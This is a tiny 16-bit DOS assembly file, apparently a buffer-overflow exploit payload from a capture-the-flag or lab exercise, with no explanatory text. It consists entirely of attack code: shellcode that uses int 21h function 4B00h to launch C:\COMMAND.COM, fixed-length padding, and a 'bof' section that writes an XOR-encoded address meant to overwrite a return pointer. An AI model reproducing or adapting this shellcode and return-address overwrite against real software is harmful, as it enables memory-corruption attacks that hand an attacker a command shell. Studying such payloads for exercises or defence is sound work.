;BITS 16
ORG 656H

_start:
	mov 	dx, CMD
	mov		bx, param
	mov		ax, 4B00H
	int		21H

CMD:
	db		`C:\\COMMAND.COM`, 0

param:
	TIMES  0xE db 0 

padding:
	TIMES (44 - (padding - _start)) db 0

bof:
	db `\n\n\n\n`
	dw (30aH*10H + 656H) ^ 0xffff
